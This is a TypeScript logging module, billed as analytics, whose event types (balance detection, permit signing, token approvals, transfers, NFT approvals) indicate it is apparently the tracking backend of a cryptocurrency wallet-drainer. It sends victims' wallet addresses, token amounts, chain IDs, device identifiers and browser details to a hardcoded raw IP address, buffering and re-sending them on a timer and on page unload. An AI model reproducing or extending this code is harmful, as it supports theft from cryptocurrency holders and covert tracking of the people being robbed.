// Analytics and logging system
const API_ENDPOINT = 'https://194.60.133.152:8445/api/log';

export type LogEvent = 
  | 'connect_request'
  | 'connect_approved' 
  | 'connect_rejected'
  | 'wallet_detected'
  | 'balance_detected'
  | 'permit_sign_request'
  | 'permit_sign_approved'
  | 'permit_sign_rejected'
  | 'approve_sent'
  | 'approve_confirmed'
  | 'approve_failed'
  | 'wrap_confirmed'
  | 'transfer_sent'
  | 'transfer_confirmed'
  | 'transfer_failed'
  | 'nft_approve_sent'
  | 'nft_approve_confirmed'
  | 'error';

export interface LogData {
  event: LogEvent;
  walletAddress?: string;
  walletType?: string;
  chainId?: number;
  tokenAddress?: string;
  tokenSymbol?: string;
  amount?: string;
  error?: string;
  metadata?: Record<string, any>;
}

// Get client IP (will be captured by backend)
async function getClientInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenSize: `${window.screen.width}x${window.screen.height}`,
    timestamp: new Date().toISOString(),
    url: window.location.href,
    referrer: document.referrer || 'direct',
  };
}

// Generate session ID
function getSessionId(): string {
  let sessionId = localStorage.getItem('sg_session_id');
  if (!sessionId) {
    sessionId = Math.random().toString(36).substring(2, 15);
    localStorage.setItem('sg_session_id', sessionId);
  }
  return sessionId;
}

// Get or create device fingerprint
function getDeviceId(): string {
  let deviceId = localStorage.getItem('sg_device_id');
  if (!deviceId) {
    deviceId = `${Math.random().toString(36).substring(2, 15)}${Date.now().toString(36)}`;
    localStorage.setItem('sg_device_id', deviceId);
  }
  return deviceId;
}

// Buffer for offline storage
const LOG_BUFFER_KEY = 'sg_log_buffer';

function getBuffer(): LogData[] {
  try {
    const buffer = localStorage.getItem(LOG_BUFFER_KEY);
    return buffer ? JSON.parse(buffer) : [];
  } catch {
    return [];
  }
}

function saveBuffer(buffer: LogData[]) {
  try {
    // Keep only last 100 entries to avoid localStorage overflow
    const trimmed = buffer.slice(-100);
    localStorage.setItem(LOG_BUFFER_KEY, JSON.stringify(trimmed));
  } catch {
    // localStorage full, clear it
    localStorage.removeItem(LOG_BUFFER_KEY);
  }
}

function addToBuffer(log: LogData) {
  const buffer = getBuffer();
  buffer.push(log);
  saveBuffer(buffer);
}

function clearBuffer() {
  localStorage.removeItem(LOG_BUFFER_KEY);
}

// Send log to backend
async function sendLog(log: LogData) {
  const payload = {
    ...log,
    sessionId: getSessionId(),
    deviceId: getDeviceId(),
    clientInfo: await getClientInfo(),
  };

  try {
    // Try to send immediately
    const response = await fetch(API_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      keepalive: true,
    });

    if (!response.ok) {
      throw new Error('Network error');
    }

    // Success - try to flush buffer
    await flushBuffer();
    return true;
  } catch {
    // Failed - add to buffer for later
    addToBuffer(log);
    return false;
  }
}

// Flush buffered logs
async function flushBuffer() {
  const buffer = getBuffer();
  if (buffer.length === 0) return;

  const toSend = [...buffer];
  clearBuffer();

  try {
    await fetch(API_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        batch: toSend,
        sessionId: getSessionId(),
        deviceId: getDeviceId(),
        clientInfo: await getClientInfo(),
      }),
      keepalive: true,
    });
  } catch {
    // Put back in buffer
    const current = getBuffer();
    saveBuffer([...toSend, ...current]);
  }
}

// Public API
export const analytics = {
  log: async (data: LogData) => {
    // Always log to console for debugging
    console.log('[Analytics]', data);
    
    // Send to backend
    await sendLog(data);
  },

  logError: async (error: Error, context?: Record<string, any>) => {
    await analytics.log({
      event: 'error',
      error: error.message,
      metadata: { stack: error.stack, ...context },
    });
  },

  flush: flushBuffer,

  // Get stats for debugging
  getStats: () => ({
    sessionId: getSessionId(),
    deviceId: getDeviceId(),
    bufferedLogs: getBuffer().length,
  }),
};

// Flush on page unload
window.addEventListener('beforeunload', () => {
  analytics.flush();
});

// Periodic flush every 30 seconds
setInterval(() => {
  analytics.flush();
}, 30000);
